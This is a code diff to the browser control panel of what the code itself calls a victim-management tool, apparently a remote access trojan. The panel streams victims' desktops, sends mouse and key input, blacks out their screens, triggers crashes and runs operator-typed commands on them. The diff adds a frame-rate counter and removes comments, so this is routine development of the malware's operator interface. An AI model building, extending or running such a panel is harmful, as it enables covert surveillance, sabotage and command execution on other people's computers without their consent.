@@ -218,7 +218,7 @@
 
   <div id="info">Connecting...</div>
 
-  <script>
+<script>
     (function() {
       const canvas = document.getElementById('screen');
       const ctx = canvas.getContext('2d', { alpha: false, desynchronized: true });
@@ -234,13 +234,17 @@
       let victimMonitors = [];
       let capW = 1920;
       let capH = 1080;
-      let cropOffsetX = 0;   // pixel offset of crop relative to virtual desktop
+      let cropOffsetX = 0;
       let cropOffsetY = 0;
       let scaleX = 1;
       let scaleY = 1;
       let frameImg = null;
       let frameReady = false;
       let blackoutState = false;
+      let lastFrameTime = 0;
+      let fpsCounter = 0;
+      let currentFPS = 0;
+      let fpsInterval = null;
 
       const socket = io({
         transports: ['websocket', 'polling'],
@@ -263,10 +267,17 @@
           frameReady = false;
           ctx.drawImage(frameImg, 0, 0, canvas.width, canvas.height);
           frameImg = null;
+          fpsCounter++;
         }
         requestAnimationFrame(render);
       }
       requestAnimationFrame(render);
+
+      // FPS counter
+      setInterval(() => {
+        currentFPS = fpsCounter;
+        fpsCounter = 0;
+      }, 1000);
 
       function processFrame(data) {
         const blob = new Blob([data], { type: 'image/jpeg' });
@@ -281,19 +292,14 @@
         img.src = url;
       }
 
-      // ── Get remote coordinates ──
-      // Maps canvas CSS pixel → remote virtual desktop pixel
-      // accounting for crop offset
       function getRemoteCoords(e) {
         const rect = canvas.getBoundingClientRect();
         let cssX = e.clientX - rect.left;
         let cssY = e.clientY - rect.top;
         cssX = Math.max(0, Math.min(cssX, canvas.width));
         cssY = Math.max(0, Math.min(cssY, canvas.height));
-        // Scale from CSS pixels to captured image pixels
         let imgX = Math.round(cssX * scaleX);
         let imgY = Math.round(cssY * scaleY);
-        // Add crop offset to get virtual desktop coordinates
         let remoteX = imgX + cropOffsetX;
         let remoteY = imgY + cropOffsetY;
         return { cssX, cssY, remoteX, remoteY };
@@ -309,7 +315,7 @@
       canvas.addEventListener('mousemove', function(e) {
         moveCursor(e);
         const coords = getRemoteCoords(e);
-        info.innerHTML = `${capW}x${capH} · <span class="coords">${coords.remoteX},${coords.remoteY}</span>`;
+        info.innerHTML = `${capW}x${capH} ${currentFPS}fps · <span class="coords">${coords.remoteX},${coords.remoteY}</span>`;
       });
 
       canvas.addEventListener('mouseleave', function() { cursorEl.style.display = 'none'; });
@@ -338,7 +344,6 @@
         socket.emit('key', e.key);
       });
 
-      // ── Render victim list ──
       function renderVictimList(list) {
         victimListEl.innerHTML = '';
         if (!list || list.length === 0) {
@@ -369,12 +374,8 @@
             document.getElementById('blackout-status-val').textContent = 'OFF';
             document.getElementById('blackout-method-val').textContent = '';
 
-            // Populate monitor selector
             populateMonitorSelector(v.monitors);
-
-            // Select victim with full desktop by default
             socket.emit('select-victim', { id: v.id, crop: null });
-
             renderVictimList(list);
             info.textContent = `Selecting ${v.id}...`;
           });
@@ -382,7 +383,6 @@
         });
       }
 
-      // ── Populate monitor dropdown ──
       function populateMonitorSelector(mons) {
         monitorSelect.innerHTML = '';
         const optFull = document.createElement('option');
@@ -403,7 +403,6 @@
         monitorSelector.style.display = 'block';
       }
 
-      // ── Handle monitor selection change ──
       monitorSelect.addEventListener('change', function() {
         if (!selectedVictim) return;
         const val = this.value;
@@ -428,12 +427,10 @@
         }
       });
 
-      // ── Sidebar toggle ──
       document.getElementById('sidebar-toggle').addEventListener('click', function() {
         sidebar.classList.toggle('collapsed');
       });
 
-      // ── Blackout ──
       document.getElementById('btn-blackout').addEventListener('click', function() {
         if (!selectedVictim) return;
         blackoutState = !blackoutState;
@@ -442,7 +439,6 @@
         this.className = 'ctrl-btn blackout' + (blackoutState ? ' active' : '');
       });
 
-      // ── Crash ──
       document.getElementById('btn-crash').addEventListener('click', function() {
         if (!selectedVictim) return;
         if (confirm('Trigger crash + restart?')) {
@@ -452,7 +448,6 @@
         }
       });
 
-      // ── Execute ──
       document.getElementById('btn-exec').addEventListener('click', function() {
         const cmd = document.getElementById('exec-cmd-input').value.trim();
         if (!cmd || !selectedVictim) return;
@@ -482,7 +477,6 @@
         capW = data.w;
         capH = data.h;
 
-        // If crop was set, update offsets
         if (data.crop) {
           cropOffsetX = data.crop.x;
           cropOffsetY = data.crop.y;
@@ -496,7 +490,6 @@
         monitorSelector.style.display = 'block';
         populateMonitorSelector(data.monitors);
 
-        // Reset dropdown to match crop
         if (data.crop) {
           const idx = (data.monitors || []).findIndex(
             m => m.x === data.crop.x && m.y === data.crop.y &&
@@ -509,7 +502,7 @@
 
         info.className = 'on';
         const viewInfo = data.crop ? `(cropped ${data.crop.w}x${data.crop.h})` : '(full desktop)';
-        info.innerHTML = `${capW}x${capH} · <span class="coords">Viewing ${data.id} ${viewInfo}</span>`;
+        info.innerHTML = `${capW}x${capH} ${currentFPS}fps · <span class="coords">Viewing ${data.id} ${viewInfo}</span>`;
       });
 
       socket.on('frame', function(f) {
@@ -559,3 +552,4 @@
   </script>
 </body>
 </html>
+
